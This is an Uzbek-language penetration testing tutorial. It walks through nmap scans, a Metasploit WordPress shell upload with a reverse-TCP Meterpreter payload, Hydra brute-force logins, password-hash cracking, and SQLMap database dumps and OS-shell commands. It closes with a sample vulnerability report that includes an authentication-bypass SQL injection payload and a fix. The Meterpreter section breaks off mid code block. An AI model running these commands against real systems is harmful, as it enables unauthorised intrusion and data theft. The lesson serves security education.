## Dars mazmuni

### Penetration Testing nima?

**Penetration Testing** (Pen Testing) - tizimning xavfsizligini tekshirish uchun hujum simulyatsiyasi.

**Maqsad**:
- Zaifliklarni topish
- Xavfsizlik darajasini baholash
- Himoya tavsiyalari berish

**Ethical Hacking** - qonuniy va ruxsat bilan xavfsizlik tekshirish.

### Pen Testing turlari

#### 1. Black Box Testing

**Tushuntirish**: Tizim haqida hech qanday ma'lumot yo'q.

**Xuddi haqiqiy hujumchi kabi**:
- Faqat tashqi ma'lumotlar
- Ichki tuzilma noma'lum
- Eng qiyin tur

#### 2. White Box Testing

**Tushuntirish**: To'liq ma'lumot bor.

**Beriladi**:
- Source code
- Arxitektura
- Login credentials
- Eng chuqur tekshirish

#### 3. Gray Box Testing

**Tushuntirish**: Qisman ma'lumot.

**Kombinatsiya**:
- Ba'zi credentials
- Qisman arxitektura
- Eng realistik

### 2. Scanning (Skanerlash)

#### Nmap - Network Scanner

**O'rnatish**:
```bash
# Ubuntu/Debian
sudo apt install nmap

# Kali Linux (oldindan o'rnatilgan)
```

**Asosiy skanlar**:

```bash
# Oddiy scan
nmap example.com

# SYN scan (stealth)
nmap -sS example.com

# Service versiyasi
nmap -sV example.com

# OS detection
nmap -O example.com

# Aggressive scan
nmap -A example.com

# Specific ports
nmap -p 80,443 example.com
nmap -p 1-1000 example.com
nmap -p- example.com  # Barcha portlar

# UDP scan
nmap -sU example.com
```

**Useful combinations**:

```bash
# Web server skanerlash
nmap -p 80,443,8080 -sV --script http-enum example.com

# Zaifliklarni qidirish
nmap -sV --script vuln example.com

# Subnet scan
nmap -sn 192.168.1.0/24

# Fast scan (top 100 ports)
nmap -F example.com
```

**Nmap Scripting Engine (NSE)**:

```bash
# SQL Injection test
nmap --script http-sql-injection example.com

# XSS test
nmap --script http-xssed example.com

# Brute force
nmap --script ssh-brute example.com
```

### 3. Gaining Access (Kirish olish)

#### Metasploit Framework

**Eng kuchli exploitation framework**.

**O'rnatish** (Kali da oldindan o'rnatilgan):

```bash
sudo apt install metasploit-framework
```

**Ishlatish**:

```bash
# Msfconsole ishga tushirish
msfconsole

# Exploit qidirish
msf6 > search wordpress

# Exploit tanlash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload

# Options ko'rish
msf6 exploit(...) > show options

# Target sozlash
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set TARGETURI /wordpress

# Payload sozlash
msf6 exploit(...) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50

# Exploit ishga tushirish
msf6 exploit(...) > exploit
```

**Meterpreter** - kuchli shell:

```bash
# Tizim ma'lumoti

#### Brute Force Attacks

**Hydra** - login brute forcing:

```bash
# O'rnatish
sudo apt install hydra

# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# HTTP Form
hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100
```

**John the Ripper** - password cracking:

```bash
# O'rnatish
sudo apt install john

# Password hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specific format
john --format=Raw-MD5 --wordlist=wordlist.txt hashes.txt

# Show cracked
john --show hashes.txt
```

**Hashcat** - GPU-accelerated:

```bash
# MD5
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# SHA-256
hashcat -m 1400 -a 0 hashes.txt wordlist.txt
```

#### SQL Injection (SQLMap)

**SQLMap** - avtomatik SQL Injection:

```bash
# O'rnatish
sudo apt install sqlmap

# Basic scan
sqlmap -u "http://example.com/page.php?id=1"

# POST request
sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"

# Database enumeration
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Tables
sqlmap -u "http://example.com/page.php?id=1" -D dbname --tables

# Dump data
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T users --dump

# OS Shell
sqlmap -u "http://example.com/page.php?id=1" --os-shell
```

#### Report namunasi

```markdown
# SQL Injection in Login Form

## Summary
The login form at https://example.com/login is vulnerable to SQL Injection attack, allowing an attacker to bypass authentication.

## Vulnerability Details
- **URL**: https://example.com/login
- **Parameter**: username
- **Type**: SQL Injection (Error-based)
- **Severity**: Critical

## Steps to Reproduce
1. Navigate to https://example.com/login
2. Enter the following payload in username field:
   ```
   admin' OR '1'='1' --
   ```
3. Enter any password
4. Click "Login"
5. Observe that authentication is bypassed

## Proof of Concept
[Screenshot showing successful bypass]
[SQLMap output]

## Impact
An attacker can:
- Bypass authentication
- Access any user account
- Extract sensitive database information
- Potentially gain administrative access

## Remediation
Use prepared statements (parameterized queries):
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

## References
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
```
